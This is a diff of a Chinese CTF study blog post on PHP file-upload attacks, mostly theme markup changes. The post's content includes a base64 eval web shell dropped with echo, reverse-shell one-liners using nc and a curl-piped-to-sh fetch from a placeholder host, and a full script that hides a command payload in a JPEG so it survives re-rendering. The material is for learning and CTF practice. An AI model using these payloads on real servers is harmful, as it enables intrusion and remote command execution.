@@ -1,73 +1,260 @@
-
 <!DOCTYPE html>
-<html lang="en" class="loading">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Web_4_PHP文件上传 - Charmersix</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="第一节 php文件上传0x1 php文件上传机制php使用临时文件移动的方式来上传文件，通过$_FILES数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的/tmp/php??????,"> 
-    <meta name="author" content="John Doe"> 
-    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
-    <link rel="icon" href="/img/favicon.png"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Charmersix">
     
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <title>
+        
+            Web_4_PHP文件上传 |
+        
+        Charmersix&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-    
-    
-    <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="Web_4_PHP文件上传 - Charmersix"/>
-    <meta name="twitter:description" content="第一节 php文件上传0x1 php文件上传机制php使用临时文件移动的方式来上传文件，通过$_FILES数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的/tmp/php??????,"/>
-    
-    
-    
-    
-    <meta property="og:site_name" content="Charmersix"/>
-    <meta property="og:type" content="object"/>
-    <meta property="og:title" content="Web_4_PHP文件上传 - Charmersix"/>
-    <meta property="og:description" content="第一节 php文件上传0x1 php文件上传机制php使用临时文件移动的方式来上传文件，通过$_FILES数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的/tmp/php??????,"/>
-    
-<link rel="stylesheet" href="/css/diaspora.css">
-
+    <link rel="shortcut icon" href="/images/head.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/head.png","avatar":"/images/ta.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://lsvf4zhg.api.lncldglobal.com","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Charmersix</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">Web_4_PHP文件上传</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
-    </div>
-    <div class="scrollbar"></div>
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">Web_4_PHP文件上传</h1>
-        <div class="stuff">
-            <span>九月 20, 2022</span>
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
             
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP-upload/" rel="tag">PHP_upload</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Study/" rel="tag">Study</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Charmersix&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/link"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/link">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
 
 
         </div>
-        <div class="content markdown">
-            <h2 id="第一节-php文件上传"><a href="#第一节-php文件上传" class="headerlink" title="第一节 php文件上传"></a>第一节 php文件上传</h2><h3 id="0x1-php文件上传机制"><a href="#0x1-php文件上传机制" class="headerlink" title="0x1 php文件上传机制"></a>0x1 php文件上传机制</h3><p>php使用临时文件移动的方式来上传文件，通过<code>$_FILES</code>数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的<code>/tmp/php??????</code>文件使用<code>move_uploaded_file</code>函数来移动到新的位置。</p>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Web_4_PHP文件上传</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/ta.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Charmersix</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-09-20 00:00:00</span>
+        <span class="mobile">2022-09-20 00:00</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-09 16:39:28</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Study/">Study</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP-upload/">PHP_upload</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="第一节-php文件上传"><a href="#第一节-php文件上传" class="headerlink" title="第一节 php文件上传"></a>第一节 php文件上传</h2><h3 id="0x1-php文件上传机制"><a href="#0x1-php文件上传机制" class="headerlink" title="0x1 php文件上传机制"></a>0x1 php文件上传机制</h3><p>php使用临时文件移动的方式来上传文件，通过<code>$_FILES</code>数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的<code>/tmp/php??????</code>文件使用<code>move_uploaded_file</code>函数来移动到新的位置。</p>
 <p>文件上传信息包含的数组<code>$_FILES</code>数组中，是支持多文件同时上传的。默认情况下，上传的名字为<code>file</code>,所以我们可以在<code>$_FILES[&#39;file&#39;]</code>这个数组中获得，我们可以获得以下信息</p>
 <ul>
 <li><code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>获得上传文件的原始文件名</li>
@@ -107,7 +294,12 @@
 <p>`文件上传，然后cookie传输</p>
 <p><code>echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;|base64 -d&gt;1.php</code></p>
 <p>再连接1.php</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112109336.png" alt="image-20220911210914228"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112109336.png"
+                      alt="image-20220911210914228"
+                ></p>
 <p>2.反弹shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `nc ip port -e /bin/sh`;</span><br><span class="line"><span class="meta">&lt;?=</span> `curl curl https:<span class="comment">//your-shell.com/ip:port |sh`;</span></span><br></pre></td></tr></table></figure>
 
@@ -126,9 +318,19 @@
 <h5 id="jpg二次渲染绕过"><a href="#jpg二次渲染绕过" class="headerlink" title="jpg二次渲染绕过"></a>jpg二次渲染绕过</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable 